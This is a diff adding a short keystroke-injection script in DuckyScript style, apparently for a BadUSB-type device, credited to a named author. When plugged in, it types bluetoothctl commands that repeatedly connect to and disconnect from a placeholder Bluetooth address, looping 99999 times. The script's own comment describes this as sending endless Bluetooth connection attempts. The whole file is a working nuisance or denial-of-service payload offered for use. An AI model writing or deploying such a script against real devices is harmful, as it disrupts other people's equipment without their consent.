@@ -1,0 +1,15 @@
+REM Author: @unveroleone | https://github.com/veroleone
+REM Sends endless Bluetooth connection attempts
+DELAY 1000
+STRING bluetoothctl
+ENTER
+DELAY 500
+STRING scan on
+ENTER
+DELAY 3000
+STRING connect AA:BB:CC:DD:EE:FF
+ENTER
+DELAY 1000
+STRING disconnect AA:BB:CC:DD:EE:FF
+ENTER
+REPEAT 99999
